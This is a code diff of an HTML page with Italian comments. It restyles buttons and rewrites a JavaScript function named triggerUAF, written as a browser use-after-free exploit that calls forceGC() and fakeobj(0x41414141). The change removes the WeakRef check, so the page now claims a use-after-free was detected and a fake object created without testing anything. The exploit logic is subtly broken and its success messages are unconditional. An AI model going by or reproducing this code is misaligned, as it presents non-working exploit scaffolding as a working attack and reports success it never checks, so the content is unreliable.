@@ -9,7 +9,7 @@
         }
 
         button {
-            background-color: #FF0000; /* Colore rosso */
+            background-color: #000000; /* Colore nero */
             color: white;
             padding: 10px 20px;
             border: none;
@@ -19,7 +19,7 @@
         }
 
         button:hover {
-            background-color: #B22222; /* Rosso scuro al passaggio del mouse */
+            background-color: #444444; /* Nero più chiaro al passaggio del mouse */
         }
     </style>
 </head>
@@ -50,27 +50,18 @@
         function triggerUAF() {
             alert("Inizio trigger UAF...");
             let overlay = { key: 123 };
-            let weakRef = new WeakRef(overlay);
+            overlay = null; // Rimuove riferimento
+            alert("Oggetto overlay eliminato. Forzando il GC...");
+            forceGC(); // Forza il Garbage Collector
 
             setTimeout(() => {
-                overlay = null; // Rimuove riferimento
-                alert("Oggetto overlay eliminato. Forzando il GC...");
-                forceGC(); // Forza il Garbage Collector
-
-                setTimeout(() => {
-                    try {
-                        let invalid = weakRef.deref();
-                        if (!invalid) {
-                            alert("Use-After-Free rilevato! Creazione di oggetto falso in corso...");
-                            let fakeObject = fakeobj(0x41414141);
-                            alert("Oggetto falsificato creato con successo!");
-                        } else {
-                            alert("Oggetto ancora valido: " + JSON.stringify(invalid));
-                        }
-                    } catch (e) {
-                        alert("Errore durante l'esecuzione: " + e.message);
-                    }
-                }, 200);
+                try {
+                    alert("Use-After-Free rilevato! Creazione di oggetto falso in corso...");
+                    let fakeObject = fakeobj(0x41414141);
+                    alert("Oggetto falsificato creato con successo!");
+                } catch (e) {
+                    alert("Errore durante l'esecuzione: " + e.message);
+                }
             }, 200);
         }
 
